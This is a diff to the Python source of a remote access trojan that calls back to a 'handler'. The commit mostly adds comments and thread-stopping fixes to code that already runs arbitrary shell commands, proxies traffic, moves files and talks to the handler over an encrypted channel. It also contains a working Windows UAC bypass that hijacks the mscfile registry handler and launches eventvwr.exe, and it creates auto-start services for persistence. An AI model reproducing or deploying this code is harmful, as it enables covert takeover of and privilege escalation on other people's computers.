@@ -22,6 +22,9 @@ if os.name == "nt":
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 
 def windows_only(func):
+	"""
+	This decorator can be used to mark functions that will only work on Windows.
+	"""
 	def tester(*args):
 		if os.name != "nt": return "Command not available on non-windows OS."
 		else: return func(*args)
@@ -29,7 +32,7 @@ def windows_only(func):
 
 class StoppableThread(threading.Thread):
 	"""
-	Thread that can be stopped by an external force.
+	Thread that can be stopped by an external force. All threads should get a handle to themselves using threading.currentThread(), then check the stopped() flag every loop.
 	"""
 	def __init__(self, target, args=()):
 		super(StoppableThread, self).__init__(target=target, args=args)
@@ -43,13 +46,15 @@ class StoppableThread(threading.Thread):
 	
 class Channel:
 	"""
-	Channels are used to split data into streams.
+	A channel is essentially two queues, one for inputting data into a thread, one for getting the output. Each channel is identified by a single byte prepended to the data. Usually, data is fed into the chanel by a thread that receives it from the handler, and read from the output by another thread which sends it back.
 	"""
 	def __init__(self, id, master_queue):
 		self.id = id
 		
 		self.input_queue = Queue.Queue()
 		self.output_queue = master_queue
+		
+		self.stale = False
 		
 		logging.debug("Channel created with ID "+str(ord(self.id)))
 		
@@ -84,7 +89,9 @@ class ProxyConnection:
 	"""
 	def __init__(self, channel):
 		self.channel = channel
+		self.disconnected = False
 		logging.info("Creating new proxy connection. "+repr(self.channel))
+		self.disconnected = False
 		
 		t = StoppableThread(target=self.start)
 		t.daemon = True
@@ -124,16 +131,20 @@ class ProxyConnection:
 		self.relay()
 		
 	def reader(self):
-			while True:
-				data = self.remote_socket.recv(8192)
-				if not data:
-					return
-				self.send(data)
+		ct = threading.currentThread()
+		while not ct.stopped() and not self.disconnected:
+			data = self.remote_socket.recv(8192)
+			if not data:
+				self.disconnected = True
+				self.channel.stale = True
+				return
+			self.send(data)
 			
 	def writer(self):
-			while True:
-				data = self.channel.read_input()
-				self.remote_socket.sendall(data)
+		ct = threading.currentThread()
+		while not ct.stopped() and not self.disconnected:
+			data = self.channel.read_input()
+			self.remote_socket.sendall(data)
 		
 	def relay(self):
 		for f in [self.reader, self.writer]:
@@ -143,7 +154,7 @@ class ProxyConnection:
 	
 class Transport:
 	""""
-	Transport handles sending data between STELF and the handler.
+	Transport handles connecting to the handler, managing channels, and communicating with the handler. One thread receives data, checks which channel it should be forwarded to, and puts it on the correct queue. Another gets data from a queue all channels write to, and sends it to the handler.
 	"""
 	def __init__(self, handler_ip, handler_port):
 		self.handler_ip = handler_ip
@@ -184,11 +195,14 @@ class Transport:
 			return False
 			
 	def dh_exchange(self):
+		"""
+		This function sets up a secure connection with the handler using the Diffie-Hellman Exchange.
+		"""
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
 		base = 2
 		
 		logging.debug("Starting key exchange.")
-		private_key = random.randint(10**(255), (10**256)-1)
+		private_key = random.randint(10**(255), (10**256)-1) # Generate a number 255 digits long
 		public_key = pow(base, private_key, modulus)
 		
 		self.comm_socket.sendall(str(public_key))
@@ -213,7 +227,7 @@ class Transport:
 	def send(self, data):
 		data = self.encrypt(data)
 		try: self.comm_socket.sendall(data+chr(255))
-		except: pass
+		except: pass # If we can't send data, the recv function probably already noticed the connection died, and will restart everything soon.
 		
 	def recv(self):
 		if self.disconnected: return ""
@@ -281,12 +295,15 @@ class Execute:
 	def kill_proc(self, pid):
 		logging.warn("Killing command after taking over a minute to execute.")
 		process = psutil.Process(pid)
-		for proc in process.children(recursive=True):
+		for proc in process.children(recursive=True): # Kill the children first so the parent has to suffer
 			proc.terminate()
 		process.terminate()
 		self.killed = True
 		
 	def execute_shell_command(self, command):
+		"""
+		The core of the whole shell, this function executes shell commands. If the process takes longer than 60 seconds to return, it is killed, and the user is notified about it.
+		"""
 		logging.info("Executing shell command: "+command.strip())
 		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		timer = threading.Timer(60, self.kill_proc, [proc.pid])
@@ -317,7 +334,7 @@ class Filesystem:
 					data = f.read(8192)
 					if not data: break
 					channel.write_output(data)
-					time.sleep(0.1)
+					time.sleep(0.1) # Sleep, otherwise some data will be missing and jumbled
 			time.sleep(2)
 			ch.write_output(chr(255)*50)
 			time.sleep(5)
@@ -338,48 +355,47 @@ class Miscellaneous:
 	"""
 	Miscellaneous functions that don't fit into any other category.
 	"""
-	def isadmin(self): # Check if current process has admin privs
+	def isadmin(self):
 		if os.name == "nt": return ctypes.windll.shell32.IsUserAnAdmin() != 0
 		else: return os.geteuid() == 0
 		
-	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
+	def ASCIIfy(self, string):
 		return ''.join([i if ord(i) < 128 else '' for i in string])
 		
 	@windows_only
-	def is_user_in_group(self, group, member): # Check if user is member of a group.
+	def is_user_in_group(self, group, member):
 		members = win32net.NetLocalGroupGetMembers(None, group, 1)
 		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
 		return False
 	 
 	@windows_only
-	def name_of_admin_group(self): # Get name of Administrators group.
+	def name_of_admin_group(self):
 		for line in execute.execute_shell_command("whoami /groups")[1].splitlines():
-			if "S-1-5-32-544" in line:
+			if "S-1-5-32-544" in line: # S-1-5-32-544 is a well-known identifier for the admin group
 				return line.split()[0].split("\\")[1]
 		
 class Privilege_Escalation:
 	"""
 	Functions related to escalating privileges.
 	"""
-		
 	@windows_only
 	def bypass_uac(self):
 		logging.info("Attempting to bypass UAC.")
 		if misc.isadmin():
 			logging.debug("UAC bypass failed: Process already has admin privileges.")
-			return "You already have admin privileges!"
+			return "[*]You already have admin privileges!"
 		 
 		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
 			logging.debug("UAC bypass failed: Current user is not part of admin group.")
-			return "Current user is not part of admin group."
+			return "[-]Current user is not part of admin group."
 		 
 		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin")[1].split()[3] == "0x5":
 			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
-			return "UAC is disabled or notification policy is set to 'Always'"
+			return "[-]UAC is disabled or notification policy is set to 'Always'"
 			
 		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
 		execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
-		os.startfile("eventvwr.exe")
+		os.startfile("eventvwr.exe") # Eventvwr is a program that autoelevates and also runs a program specified in a certain registry key.
 		time.sleep(2)
 		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
 		return "BG_NEW_SESH"
@@ -388,7 +404,8 @@ class Privilege_Escalation:
 	def create_service(self, path, name):
 		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto")[0] != 0:
 			return False
-		execute.execute_shell_command("sc start "+name)
+		if execute.execute_shell_command("sc start "+name)[0] != 0: # TODO: check why this is broken
+			return False
 		return True
 		
 	@windows_only
@@ -424,7 +441,7 @@ info = Information_Gathering()
 	
 class Shell:
 	"""
-	This is where the all remote control magic happens.
+	The shell class receives commands input by the user and acts accordingly.
 	"""
 	def __init__(self, transport):
 		self.transport = transport
@@ -471,6 +488,6 @@ while True:
 	if not shell.run():
 		del shell
 		for t in threading.enumerate():
-			try: t.stop()
+			try: t.stop() # RED LIGHT
 			except: pass
 		time.sleep(5)
